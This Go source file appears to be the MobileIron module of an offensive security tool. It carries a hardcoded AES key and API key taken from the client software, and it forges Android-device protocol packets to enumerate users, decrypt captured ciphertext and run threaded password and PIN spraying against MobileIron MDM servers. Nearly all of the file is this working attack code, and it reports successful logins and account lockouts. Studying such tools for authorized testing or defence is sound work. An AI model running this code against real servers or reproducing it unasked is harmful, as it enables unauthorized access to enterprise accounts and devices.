package mobileiron

import (
	"bytes"
	"fmt"
	"regexp"
	"strconv"
	"strings"
	"time"

	"compress/zlib"
	"crypto/aes"
	"encoding/binary"
	"encoding/hex"

	"github.com/andreburgaud/crypt2go/ecb"
	"github.com/andreburgaud/crypt2go/padding"

	"github.com/mr-pmillz/dauthi/utils"
)

// MDMA ...
type MDMA struct {
	Opts  utils.ChargeOpts
	Logr  *utils.Logger
	Count int
	Valid bool
	Cycle
}

// Cycle ...
type Cycle struct {
	Buff   *chan bool
	Block  *chan bool
	Length int
	API    *utils.API
}

const (
	// Usage is tool usage options
	Usage = `
  MobileIron Options:
    -a                     User-Agent for request [default: MobileIron/OpenSSLWrapper (Dalvik VM)]
    -c                     MobileIron pinSetup cookie
    -P                     MobileIron Authentication TLS Port [default: 9997]

    -guid                  MobileIron GUID value
    -pin                   MobileIron Authentication PIN
  `

	// Methods are available tool methods
	Methods = `
  MobileIron Methods:
    Disco                  MobileIron endpoint discovery query
    enum                   MobileIron username validation
    decrypt                Decrypt MobileIron CipherText
    Prof                   Profile the MobileIron provisioning details
    Auth-user              MobileIron user based authentication
    Auth-pin               MobileIron PIN authentication
    Auth-pinpass           MobileIron Auth-pinpassword authentication
    Auth-pinuser           MobileIron PIN user based authentication
	`

	ironAPI = `OTY1MzJmZWI2ZjM0NjUzZjQ2MDRkMDY3MTNkNWY3NGQ3MzJlZjlkNA==`
	ironKey = "\xdc\x70\x40\x3f\x78\xde\xc3\x04\x0e\xa5\x36\xc1\xd8\x8d\xa1\xab\xfa\xbb\x56\xda\x3d\xd1\x47\x10\xd2\x5a\x9a\x5f\xec\x6e\x24\xe0"

	pinInit = "MIPR\x00\x02\x00\x00\x00\x00{{SIZE}}{{GUID}}\x00\x00\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x9b\x00\x98" +
		"RSN={{UUID}}\r\ncookie={{COOKIE}}\r\nmode=0\r\nplatform_flags=0x143\r\nchecksum={{UUID}}{{UUID}}{{UUID}}{{UUID}}\r\n\x00"

	authInitOP    = "\x1c\x03\x4d\x03\x4a"
	userAuthOP    = "\x1c\x03\xad\x03\xaa"
	pinAuthOP     = "\x1c\x03\x78\x03\x75"
	pinPassAuthOP = "\x1c\x03\xd8\x03\xd5"

	aTemplate = "MIPR\x00\x02\x00\x00\x00\x00{{SIZE}}{{GUID}}\x00\x00\x00\x00\x00\x00\x00\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00{{OPCODE}}" +
		"RSN={{UUID}}\r\nmode=0\r\nplatform_flags=0x143\r\nsafety_net_enabled=true\r\n{{USER}}{{PASS}}{{PIN}}registration_operator_name=rustyIron\r\n" +
		"reg_uuid={{UUID}}\r\nCellularTechnology=GSM\r\nClient_build_date=Dec 02 2020 17:24:10\r\nClient_version=11.0.0.0.115R\r\nClient_version_code=593\r\n" +
		"afw_capable=true\r\nbrand=google\r\nclient_name=com.mobileiron\r\ncountry_code=0\r\ncurrent_mobile_number=+14469756315\r\ncurrent_operator_name=unknown\r\n" +
		"device=walleye\r\ndevice_id={{UUID}}\r\ndevice_manufacturer=Google\r\ndevice_model=Pixel 2\r\ndevice_type=GSM\r\ndisplay_size=2729X1440\r\n" +
		"home_operator=rustyIron::333333\r\nincremental=6934943\r\nip_address=172.16.34.14\r\nlocale=en-US\r\noperator=rustyIron\r\n" +
		"os_build_number=walleye-user 11 RP1A.201005.004.A1 6934943 release-keys\r\nos_version=30\r\nphone=+14469756315\r\nplatform=Android\r\nplatform_name=11\r\n" +
		"security_patch=2020-12-05\r\nsystem_version=11\r\n\x00"

	rawAuth = "MIPR\x00\x02\x00\x00\x00\x00{{SIZE}}{{GUID}}\x00\x00\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x78\x00\x17\x00\x14" +
		"{{USER}}:{{PASS}}\x00"

	gatewayCustomerAPI = `https://appgw.mobileiron.com/api/v1/gateway/customers/servers?api-key=%s&domain=%s`
	TCP                = "tcp"
	authUser           = "Auth-user"
	authPin            = "Auth-pin"
	authPinPass        = "Auth-pinpass" //nolint:gosec
	authPinUser        = "Auth-pinuser"
	_enum              = "enum"
)

func encrypt(pt, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	mode := ecb.NewECBEncrypter(block)
	padder := padding.NewPkcs7Padding(mode.BlockSize())
	pt, err = padder.Pad(pt) // padd last Block of plaintext if Block size less than Block cipher size
	if err != nil {
		panic(err.Error())
	}
	ct := make([]byte, len(pt))
	mode.CryptBlocks(ct, pt)
	return ct
}

func decrypt(ct, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	mode := ecb.NewECBDecrypter(block)
	pt := make([]byte, len(ct))
	mode.CryptBlocks(pt, ct)
	padder := padding.NewPkcs7Padding(mode.BlockSize())
	pt, err = padder.Unpad(pt) // unpad plaintext after decryption
	if err != nil {
		panic(err.Error())
	}
	return pt
}

func inflate(buf []byte) ([]byte, error) {
	b := bytes.NewReader(buf[32:])

	r, err := zlib.NewReader(b)
	if err != nil {
		return nil, err
	}
	tbuf := new(bytes.Buffer)
	tbuf.ReadFrom(r)
	return tbuf.Bytes(), nil
}

func int2Byte(num int) []byte {
	data := new(bytes.Buffer)
	binary.Write(data, binary.BigEndian, uint32(num)) //nolint:gosec
	return data.Bytes()
}

// Init MDMA with default values and return obj
func Init(o utils.ChargeOpts) *MDMA {
	if o.Agent == "" {
		o.Agent = "MobileIron/OpenSSLWrapper (Dalvik VM)"
	}
	if o.Port == "" {
		o.Port = "9997"
	}
	if o.RUUID {
		o.UUID = utils.RandUUID(8)
	}
	log := utils.NewLogger("mobileiron")

	return &MDMA{
		Opts:  o,
		Logr:  log,
		Valid: false,
		Cycle: Cycle{
			API: &utils.API{
				Debug: o.Debug,
				Log:   log,
				Proxy: o.Proxy},
		},
	}
}

// Clone copies an *MDMA for process threading
func (m *MDMA) Clone() *MDMA {
	clone := Init(m.Opts) // assign target
	clone.Cycle.Block = m.Cycle.Block
	clone.Cycle.Buff = m.Cycle.Buff

	return clone
}

// Parser wrapper to parse JSON/XML objects
func (m *MDMA) Parser(data interface{}, p string) bool {
	switch p {
	case "json":
		err := m.Cycle.API.Resp.ParseJSON(data)
		if err != nil {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Response Marshall Error: %v", err)
			return true
		}

	case "xml":
		err := m.Cycle.API.Resp.ParseXML(data)
		if err != nil {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Response Marshall Error: %v", err)
			return true
		}
	}

	return false
}

// Disco ...
func (m *MDMA) Disco() {
	m.Cycle.API.Name = `gatewayCustomerAPI`
	m.Cycle.API.URL = fmt.Sprintf(gatewayCustomerAPI, ironAPI, m.Opts.Endpoint)
	m.Cycle.API.Data = ""
	m.Cycle.API.Method = `GET`
	m.Cycle.API.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent": []string{m.Opts.Agent}}}

	m.Cycle.API.WebCall()
	if m.Cycle.API.Resp.Status != 200 {
		m.Logr.Failf([]interface{}{m.Opts.Endpoint}, "Discovery Failed")
		return
	}

	m.Validate()
}

// Prof ...
func (m *MDMA) Prof() {
	data := strings.ReplaceAll(aTemplate, "{{OPCODE}}", authInitOP)
	data = strings.ReplaceAll(data, "{{GUID}}", "\xff\xff\xff\xff")
	data = strings.ReplaceAll(data, "{{UUID}}", strings.ToLower(m.Opts.UUID))
	data = strings.ReplaceAll(data, "{{USER}}", "")
	data = strings.ReplaceAll(data, "{{PASS}}", "")
	data = strings.ReplaceAll(data, "{{PIN}}", "")
	buff := int2Byte(len(strings.ReplaceAll(data, "{{SIZE}}", "")) + 2)
	data = strings.ReplaceAll(data, "{{SIZE}}", string(buff[2:]))

	m.Cycle.API.Name = m.Opts.Method
	m.Cycle.API.URL = m.Opts.Endpoint + ":" + m.Opts.Port
	m.Cycle.API.Data = ""
	m.Cycle.API.Method = TCP
	m.Cycle.API.Opts = &map[string]interface{}{
		`request`: []string{data}}
	m.Cycle.API.Offset = 1024

	m.Cycle.API.SocketTLSDial()
	if m.Cycle.API.Resp.Body == nil {
		m.Logr.Errorf([]interface{}{m.Opts.Endpoint}, "Profile Failure")
		return
	}

	// Identify if Buff data is zLib compressed
	if string(m.Cycle.API.Resp.Body[32:34]) == "\x78\x9c" {
		buf, err := inflate(m.Cycle.API.Resp.Body)
		if err != nil {
			if m.Opts.Debug > 0 {
				m.Logr.Errorf(nil, "Decompression Error: %v", err)
				return
			}
		} else {
			m.Opts.Cookie = regexp.MustCompile(`cookie=(.*?)\n`).FindStringSubmatch(string(buf))[1]
			m.Opts.UserName = regexp.MustCompile(`userId=(.*?)\n`).FindStringSubmatch(string(buf))[1]
			m.Opts.GUID, _ = strconv.Atoi(regexp.MustCompile(`senderGUID=(.*?)\n`).FindStringSubmatch(string(buf))[1])
		}
	}

	m.Validate()
}

// Auth ...
func (m *MDMA) Auth() {
	var file []byte
	var err error

	if m.Opts.File != "" {
		file, err = utils.ReadFile(m.Opts.File)
		if err != nil {
			m.Logr.Fatalf([]interface{}{m.Opts.File}, "File Read Failure")
		}
	}

	lines := strings.Split(string(file), "\n")
	block := make(chan bool, m.Opts.Threads)
	buff := make(chan bool, len(lines))
	m.Cycle.Block = &block
	m.Cycle.Buff = &buff
	m.Cycle.Length = len(lines)

	m.Logr.Infof([]interface{}{m.Opts.Method}, "threading %d values across %d threads", m.Cycle.Length, m.Opts.Threads)

	for _, line := range lines {
		if len(lines) > 1 && line == "" {
			*m.Cycle.Buff <- true
			continue
		}

		target := m.Clone()

		switch m.Opts.Method {
		case authUser, _enum:
			if line != "" {
				target.Opts.UserName = line
			}
			d1 := strings.ReplaceAll(aTemplate, "{{OPCODE}}", authInitOP)
			d1 = strings.ReplaceAll(d1, "{{GUID}}", "\xff\xff\xff\xff")
			d1 = strings.ReplaceAll(d1, "{{UUID}}", strings.ToLower(target.Opts.UUID))
			d1 = strings.ReplaceAll(d1, "{{USER}}", "")
			d1 = strings.ReplaceAll(d1, "{{PASS}}", "")
			d1 = strings.ReplaceAll(d1, "{{PIN}}", "")
			b1 := int2Byte(len(strings.ReplaceAll(d1, "{{SIZE}}", "")) + 2)

			d2 := strings.ReplaceAll(aTemplate, "{{OPCODE}}", userAuthOP)
			d2 = strings.ReplaceAll(d2, "{{GUID}}", "\xff\xff\xff\xff")
			d2 = strings.ReplaceAll(d2, "{{UUID}}", strings.ToLower(target.Opts.UUID))
			d2 = strings.ReplaceAll(d2, "{{USER}}", "auth_username="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.Opts.UserName), []byte(ironKey))))+"\r\n")
			d2 = strings.ReplaceAll(d2, "{{PASS}}", "auth_password="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.Opts.Password), []byte(ironKey))))+"\r\n")
			d2 = strings.ReplaceAll(d2, "{{PIN}}", "")
			b2 := int2Byte(len(strings.ReplaceAll(d2, "{{SIZE}}", "")) + 2)

			target.Cycle.API.Name = m.Opts.Method
			target.Cycle.API.URL = target.Opts.Endpoint + ":" + target.Opts.Port
			target.Cycle.API.Data = ""
			target.Cycle.API.Method = TCP
			target.Cycle.API.Opts = &map[string]interface{}{
				`request`: []string{
					strings.ReplaceAll(d1, "{{SIZE}}", string(b1[2:])),
					strings.ReplaceAll(d2, "{{SIZE}}", string(b2[2:]))}}
			target.Cycle.API.Offset = 167

			if m.Opts.Method == _enum {
				for target.Count = 0; target.Count < 6; target.Count++ {
					target.Thread()
				}
				continue
			}

		case authPin:
			if line != "" {
				target.Opts.PIN = line
			}
			d1 := strings.ReplaceAll(aTemplate, "{{OPCODE}}", authInitOP)
			d1 = strings.ReplaceAll(d1, "{{GUID}}", "\xff\xff\xff\xff")
			d1 = strings.ReplaceAll(d1, "{{UUID}}", strings.ToLower(target.Opts.UUID))
			d1 = strings.ReplaceAll(d1, "{{USER}}", "")
			d1 = strings.ReplaceAll(d1, "{{PASS}}", "")
			d1 = strings.ReplaceAll(d1, "{{PIN}}", "")
			b1 := int2Byte(len(strings.ReplaceAll(d1, "{{SIZE}}", "")) + 2)

			d2 := strings.ReplaceAll(aTemplate, "{{OPCODE}}", pinAuthOP)
			d2 = strings.ReplaceAll(d2, "{{GUID}}", "\xff\xff\xff\xff")
			d2 = strings.ReplaceAll(d2, "{{UUID}}", strings.ToLower(target.Opts.UUID))
			d2 = strings.ReplaceAll(d2, "{{USER}}", "")
			d2 = strings.ReplaceAll(d2, "{{PASS}}", "")
			d2 = strings.ReplaceAll(d2, "{{PIN}}", "auth_pin="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.Opts.PIN), []byte(ironKey))))+"\r\n")
			b2 := int2Byte(len(strings.ReplaceAll(d2, "{{SIZE}}", "")) + 2)

			target.Cycle.API.Name = target.Opts.Method
			target.Cycle.API.URL = target.Opts.Endpoint + ":" + target.Opts.Port
			target.Cycle.API.Data = ""
			target.Cycle.API.Method = TCP
			target.Cycle.API.Opts = &map[string]interface{}{
				`request`: []string{
					strings.ReplaceAll(d1, "{{SIZE}}", string(b1[2:])),
					strings.ReplaceAll(d2, "{{SIZE}}", string(b2[2:]))}}
			target.Cycle.API.Offset = 167

		case authPinPass:
			if line != "" {
				target.Opts.PIN = line
			}
			d1 := strings.ReplaceAll(aTemplate, "{{OPCODE}}", authInitOP)
			d1 = strings.ReplaceAll(d1, "{{GUID}}", "\xff\xff\xff\xff")
			d1 = strings.ReplaceAll(d1, "{{UUID}}", strings.ToLower(target.Opts.UUID))
			d1 = strings.ReplaceAll(d1, "{{USER}}", "")
			d1 = strings.ReplaceAll(d1, "{{PASS}}", "")
			d1 = strings.ReplaceAll(d1, "{{PIN}}", "")
			b1 := int2Byte(len(strings.ReplaceAll(d1, "{{SIZE}}", "")) + 2)

			d2 := strings.ReplaceAll(aTemplate, "{{OPCODE}}", pinPassAuthOP)
			d2 = strings.ReplaceAll(d2, "{{GUID}}", "\xff\xff\xff\xff")
			d2 = strings.ReplaceAll(d2, "{{UUID}}", strings.ToLower(target.Opts.UUID))
			d2 = strings.ReplaceAll(d2, "{{USER}}", "auth_username="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.Opts.UserName), []byte(ironKey))))+"\r\n")
			d2 = strings.ReplaceAll(d2, "{{PASS}}", "auth_password="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.Opts.Password), []byte(ironKey))))+"\r\n")
			d2 = strings.ReplaceAll(d2, "{{PIN}}", "auth_pin="+strings.ToUpper(fmt.Sprintf("%x", encrypt([]byte(target.Opts.PIN), []byte(ironKey))))+"\r\n")
			b2 := int2Byte(len(strings.ReplaceAll(d2, "{{SIZE}}", "")) + 2)

			target.Cycle.API.Name = m.Opts.Method
			target.Cycle.API.URL = m.Opts.Endpoint + ":" + m.Opts.Port
			target.Cycle.API.Data = ""
			target.Cycle.API.Method = TCP
			target.Cycle.API.Opts = &map[string]interface{}{
				`request`: []string{
					strings.ReplaceAll(d1, "{{SIZE}}", string(b1[2:])),
					strings.ReplaceAll(d2, "{{SIZE}}", string(b2[2:]))}}
			target.Cycle.API.Offset = 167

		case authPinUser:
			if line != "" {
				target.Opts.UserName = line
			}
			d1 := strings.ReplaceAll(pinInit, "{{UUID}}", strings.ToLower(target.Opts.UUID))
			d1 = strings.ReplaceAll(d1, "{{GUID}}", string(int2Byte(target.Opts.GUID)))
			d1 = strings.ReplaceAll(d1, "{{COOKIE}}", target.Opts.Cookie)
			b1 := int2Byte(len(strings.ReplaceAll(d1, "{{SIZE}}", "")) + 2)

			d2 := strings.ReplaceAll(rawAuth, "{{GUID}}", string(int2Byte(target.Opts.GUID)))
			d2 = strings.ReplaceAll(d2, "{{USER}}", target.Opts.UserName)
			d2 = strings.ReplaceAll(d2, "{{PASS}}", target.Opts.Password)
			b2 := int2Byte(len(strings.ReplaceAll(d2, "{{SIZE}}", "")) + 2)

			target.Cycle.API.Name = target.Opts.Method
			target.Cycle.API.URL = target.Opts.Endpoint + ":" + target.Opts.Port
			target.Cycle.API.Data = ""
			target.Cycle.API.Method = TCP
			target.Cycle.API.Opts = &map[string]interface{}{
				`request`: []string{
					strings.ReplaceAll(d1, "{{SIZE}}", string(b1[2:])),
					strings.ReplaceAll(d2, "{{SIZE}}", string(b2[2:]))}}
			target.Cycle.API.Offset = 167
		}
		target.Thread()
	}

	for i := 0; i < m.Cycle.Length; i++ {
		<-*m.Cycle.Buff
	}
	close(*m.Cycle.Block)
	close(*m.Cycle.Buff)
}

// Thread represents the threading process to loop multiple requests
func (m *MDMA) Thread() {
	*m.Cycle.Block <- true
	go func() {
		if m.Valid {
			<-*m.Cycle.Block
			return
		}

		m.API.SocketTLSDial()
		if m.API.Resp.Status != 200 {
			if m.Opts.Miss < m.Opts.Retry {
				m.Opts.Miss++
				m.Logr.Infof([]interface{}{m.Opts.Tenant, m.Opts.Endpoint, m.Opts.UserName, m.Opts.Password}, "Retrying Request")
				<-*m.Cycle.Block
				m.Thread()
				return
			}
			m.Logr.Failf([]interface{}{m.Opts.UserName, m.Opts.Password, m.Opts.PIN, m.Opts.GUID, m.Opts.Cookie}, "Null Server Response")
		}
		m.Validate()

		// Sleep interval through Thread loop
		time.Sleep(time.Duration(m.Opts.Sleep) * time.Second)
		<-*m.Cycle.Block
		*m.Cycle.Buff <- true
	}()
}

// Validate result takes a byte array and validates the MobileIron response
func (m *MDMA) Validate() {
	switch m.Opts.Method {
	case "Disco":
		var check struct {
			Result struct {
				HostName string `json:"hostName"`
				Domain   string `json:"domain"`
			} `json:"result"`
		}
		if m.Parser(&check, "json") {
			return
		}

		if check.Result.Domain != "" {
			m.Logr.Successf([]interface{}{check.Result.HostName}, "Endpoint Discovery")
			return
		}
		m.Logr.Failf([]interface{}{m.Opts.Endpoint}, "Discovery Failed")

	case "Prof", authUser, _enum, authPin, authPinPass, authPinUser:
		type action struct {
			name string
			pre  []interface{}
			post []interface{}
		}
		if strings.Contains(string(m.Cycle.API.Resp.Body[32:35]), "\x00\x1d\x01") {
			if m.Opts.Debug > 0 {
				m.Logr.Infof([]interface{}{m.Opts.Method}, "Initialization Successful")
			}
		} else if strings.Contains(string(m.Cycle.API.Resp.Body[:2]), "\x00\x00") {
			m.Logr.Failf([]interface{}{m.Opts.Endpoint}, "Null Response")
		}

		msg := map[string]action{
			"\x00\x1d\x01\x1b\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.Opts.Endpoint}, []interface{}{"User Authentication Endabled"}},
			"\x00\x1d\x01\x16\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.Opts.Endpoint}, []interface{}{"PIN Authentication Enabled"}},
			"\x00\x1d\x01\x2f\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.Opts.Endpoint}, []interface{}{"PIN-Password Authentication Enabled"}},
			"\x00\x1d\x01\x2d\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.Opts.Endpoint}, []interface{}{"PIN-Password Authentication Enabled"}},
			"\x00\x1d\x01\x1a\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.Opts.Endpoint}, []interface{}{"User Authentication + Mutual Certificate Enabled"}},
			"\x00\x1d\x01\x2e\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.Opts.Endpoint}, []interface{}{"PIN Authentication + Mutual Certificate Authentication Enabled"}},
			"\x00\x1d\x01\x15\x00\x00\x01\xf6\x01": action{"info", []interface{}{m.Opts.Endpoint}, []interface{}{"PIN-Password + Mutual Certificate Authentication Enabled"}},
			"\x00\x1d\x00\x32\x00\x00\x01\x93":     action{"fail", []interface{}{m.Opts.UserName, m.Opts.Password, m.Opts.PIN}, []interface{}{"Authentication Failure: %s", m.Cycle.API.Resp.Body[42:167]}},
			"\x00\x1d\x00\x64\x00\x00\x01\x93":     action{"success", []interface{}{m.Opts.UserName, m.Opts.Password}, []interface{}{"Authentication Successful"}},
			"\x78\x9c\xbd":                         action{"success", []interface{}{m.Opts.UserName, m.Opts.Password}, []interface{}{"Authentication Successful - Configuration Received"}},
			"\x00\x1d\x00\x4c\x00\x00\x01\x93":     action{"info", []interface{}{m.Opts.UserName, m.Opts.Password}, []interface{}{"Account Lockout: %s", m.Cycle.API.Resp.Body[42:167]}},
			"\x00\x1d\x00\x4b\x00\x00\x01\x93":     action{"info", []interface{}{m.Opts.UserName, m.Opts.Password}, []interface{}{"Account Lockout: %s", m.Cycle.API.Resp.Body[42:167]}},
			"\x00\x1d\x00\x84\x00":                 action{"fail", []interface{}{m.Opts.Endpoint}, []interface{}{"Device Unregistered: %s", m.Cycle.API.Resp.Body[42:167]}},
			"\x00\x00\x00\x53\x00":                 action{"fail", []interface{}{m.Opts.Endpoint}, []interface{}{"Unknown Client ID: %s", m.Cycle.API.Resp.Body[38:167]}},
			"\x00\x1d\x00\x1b\x00\x00\x01\x90\x00": action{"fail", []interface{}{m.Opts.Endpoint}, []interface{}{"Submission Failure: %s", m.Cycle.API.Resp.Body[42:167]}},
		}

		check := string(m.Cycle.API.Resp.Body[32:41])
		for key, val := range msg {
			fmt.Printf("%v\n", val)
			if strings.Contains(check, key) {
				switch val.name {
				case "info":
					m.Logr.Infof(val.pre, val.post[0].(string), val.post[1:]...)
					return

				case "fail":
					m.Logr.Failf(val.pre, val.post[0].(string), val.post[1:]...)
					return

				case "success":
					m.Logr.Successf(val.pre, val.post[0].(string), val.post[1:]...)
					return
				}
			}
		}
		m.Logr.Infof([]interface{}{m.Opts.Endpoint, fmt.Sprintf("%x", m.Cycle.API.Resp.Body[32:41])}, "Unknown Response: %x")
	}
}

// Call represents the switch function for activating all class methods
func (m *MDMA) Call() {
	switch m.Opts.Method {
	case "Disco":
		if m.Opts.Endpoint == "" {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Domain required")
			return
		}
		m.Disco()

	case "Prof":
		if m.Opts.Endpoint == "" {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Endpoint required")
			return
		}
		m.Prof()

	case "decrypt":
		if m.Opts.Endpoint == "" {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "CipherTXT required")
			return
		}
		b, _ := hex.DecodeString(m.Opts.Endpoint)
		m.Logr.Successf(nil, "Decrypted Cipher: %s - %q", m.Opts.Endpoint, decrypt(b, []byte(ironKey)))

	case authUser, _enum, authPin, authPinPass, authPinUser:
		m.Auth()

	default:
		m.Logr.StdOut(Methods)
		m.Logr.Fatalf(nil, "Invalid Method Selected %v", m.Opts.Method)
	}
}
